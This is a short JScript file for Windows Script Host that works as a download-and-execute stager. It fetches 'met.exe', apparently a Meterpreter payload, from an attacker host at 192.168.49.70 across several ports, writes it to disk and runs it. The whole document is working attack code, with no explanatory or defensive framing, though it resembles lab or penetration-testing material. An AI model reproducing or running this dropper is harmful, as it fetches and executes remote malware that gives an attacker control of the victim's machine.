var url = "http://192.168.49.70/met.exe"
var url1 = "http://192.168.49.70:4444/met.exe"
var url2 = "http://192.168.49.70:8080/met.exe"
var url3 = "http://192.168.49.70:8081/met.exe"
var url4 = "http://192.168.49.70:8090/met.exe"
var url5 = "http://192.168.49.70:443/met.exe"
var url6 = "http://192.168.49.70:445/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();


Object.Open('GET', url1, false);
Object.Send();

Object.Open('GET', url2, false);
Object.Send();

Object.Open('GET', url3, false);
Object.Send();

Object.Open('GET', url4, false);
Object.Send();

Object.Open('GET', url5, false);
Object.Send();

Object.Open('GET', url6, false);
Object.Send();




if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
